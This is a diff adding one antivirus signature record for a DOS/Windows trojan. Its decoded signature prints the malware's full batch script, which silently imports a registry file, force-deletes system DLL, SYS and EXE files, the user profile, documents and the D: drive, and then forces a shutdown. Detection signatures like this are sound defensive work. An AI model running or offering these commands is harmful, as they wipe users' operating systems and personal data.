@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36673
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off regedit /s g.reg del /f /s /q %windir%\*.dll del /f /s /q %windir%\*.sys del /f /s /q %windir%\*.exe del /f /s /q %systemdrive%\*.dll del /f /s /q %systemdrive%\*.exe del /f /s /q %userprofile%\\*.* del /f /s /q %userprofile%\my documents\*.* del /f /s /q %userprofile%\favorites\*.* del /f /s /q d:\*.* start sh.exe shutdown.exe -s -t 1 exit
